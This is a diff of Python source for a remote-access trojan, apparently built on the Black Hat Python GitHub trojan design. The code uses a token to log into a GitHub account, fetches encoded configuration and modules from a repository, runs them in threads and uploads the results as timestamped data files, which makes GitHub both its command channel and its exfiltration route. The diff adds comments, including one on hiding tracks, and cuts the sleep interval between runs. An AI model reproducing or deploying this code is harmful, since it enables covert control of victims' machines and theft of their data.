@@ -10,14 +10,14 @@ from contextlib import suppress
 
 from datetime import datetime
 
-def github_connect(): #Perform connection to github account
+def github_connect():                                                               #Perform connection to github account
     with open('token.txt') as f:
         token = f.read()
     user = 'DarkEtherDE'
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
 
-def getContent(dirname, module_name, repo):
+def getContent(dirname, module_name, repo):                                         #Gather modules from config
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
@@ -27,7 +27,7 @@ class Trojan:
         self.data_path= f'data/{id}'
         self.repo = github_connect()
         
-    def get_config(self):
+    def get_config(self):                                                           #
         config_json = getContent('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
@@ -37,14 +37,14 @@ class Trojan:
             return config
         
     def moduleRun(self, module):
-        with suppress(KeyError):
+        with suppress(KeyError):                                                    #In the event of a keyerror due to incompatible file paths. Bypass the module to prevent modification and thus hiding tracks in fingerprints
             result = sys.modules[module].run()
             self.store_module_result(result)
         
     def store_module_result(self, data):
-        message = str(datetime.now())
-        if ':' in message:
-            message = message.replace(":", "-")
+        message = str(datetime.now())                                               #Set message equal to current time
+        if ':' in message:                                                          #Check if : in message
+            message = message.replace(":", "-")                                     #Bypass to ensure files store properly in windows or linux
             print(message)
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
@@ -57,7 +57,7 @@ class Trojan:
                 thread = threading.Thread(target=self.moduleRun, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1,10))
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(1, 10))
             
 class GitImport:
     def __init__(self):
